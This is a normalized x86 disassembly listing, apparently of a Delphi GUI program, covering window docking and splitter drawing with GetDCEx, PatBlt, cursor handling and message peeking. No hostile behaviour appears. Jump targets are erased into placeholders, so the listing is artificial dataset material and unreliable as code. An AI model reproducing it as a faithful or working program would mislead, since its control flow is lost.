xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_40331c
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_456fe8
mov edx eax
mov eax edi
call sub_45748c
mov eax edi
call sub_4572ec
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_458fec
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_457818
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_458fec
mov edx [ eax + 0x14 ]
mov eax esi
call sub_457818
mov eax [ ebx + 0x14 ]
call sub_40331c
mov eax edi
call sub_40331c
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_458a58
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_453be4
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_40810c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_45748c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_453b50
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_45748c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_458e74
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_458fec
xor edx edx
mov eax edi
call sub_457818
sub_458b34
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_457464
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402abc
mov edx eax
mov eax ebx
call sub_45748c
sub_458b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_458bdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458be2
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_458be8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_458c97
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4571f4
mov eax [ ebp - 0x8 ]
call sub_458b70
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_458be8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458c9e
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_458be8
pop ecx
sub_458ca4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_458ddd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_458d8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_453b50
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458d93
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_458b70
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_453b64
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_458d93
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_458be8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458de4
lea eax [ ebp - 0x14 ]
call sub_404118
retn
sub_458dec
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45753c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457564
call sub_458dec
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45753c
call sub_458dec
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_456f6c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_457464
mov edx eax
mov eax ebx
call sub_45748c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_45748c
jmp r-xdata
sub_458e74
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_458dec
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_458eb8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_457464
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_45748c
sub_458ee8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4550b4
mov edx eax
mov eax [ rw-data ]
call sub_459a48
mov eax [ ebx + 0x14 ]
call sub_4550b4
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_458ffc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_458f48
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_459a48
mov eax ebx
call sub_458ffc
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_45748c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_45748c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_458e74
push ebx
push sub_458fec
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_457818
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_458fc4
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_453b50
test eax eax
jle r-xdata
push ebx
push sub_458fec
xor edx edx
mov eax ebx
call sub_457818
sub_458ffc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_457030
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_457030
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_45709c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_45709c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_425300
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_4590e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4590e8
pop ecx
mov eax ebx
call sub_457464
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_457464
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4590e8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_457464
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42a4b8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_459178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457464
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_456fe8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_457464
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_4590e8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4591c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44e254
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44e254
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_459244
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_456ef4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_456fa0
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_457548
test eax eax
je r-xdata
mov eax esi
call sub_456f6c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_458fec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_457818
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_457548
mov edx [ ebx + 0x20 ]
call sub_4574a0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_459244
pop ecx
sub_4592c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_456f50
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_456f50
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_457548
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4592c4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_458fec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_457818
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_45714c
mov eax edi
call sub_45753c
test eax eax
je r-xdata
mov eax edi
call sub_457548
mov esi eax
mov eax esi
call sub_457464
push eax
mov eax esi
call sub_456fa0
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_45753c
call sub_457464
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_457464
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_45748c
mov eax esi
call sub_457464
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45748c
mov eax edi
call sub_457548
call sub_4574dc
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_456fa0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_45748c
mov eax edi
call sub_45753c
call sub_4574dc
mov bl 0x1
jmp r-xdata
sub_4593fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4577b0
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_417644
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457fa4
test eax eax
je r-xdata
push ebp
call sub_459244
pop ecx
push ebp
call sub_4592c4
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4591c8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_459484
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_457030
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_457030
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_459178
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_459178
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_459514
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4598ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e50
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457fa4
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_458f48
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e50
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457fa4
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44e3f8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4598f3
lea eax [ ebp - 0x48 ]
call sub_404118
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4550b4
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_44d114
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44f5cc
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404118
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4593fc
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_453be4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_458ffc
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e50
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_459484
pop ecx
mov eax [ ebp - 0x4 ]
call sub_458ffc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e50
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457fa4
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_44e7d4
jmp r-xdata
mov eax edi
call sub_46add4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457fa4
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44e254
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_44e8b4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40416c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458ee8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c4d4
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4550b4
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44ef74
jmp r-xdata
sub_4598fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
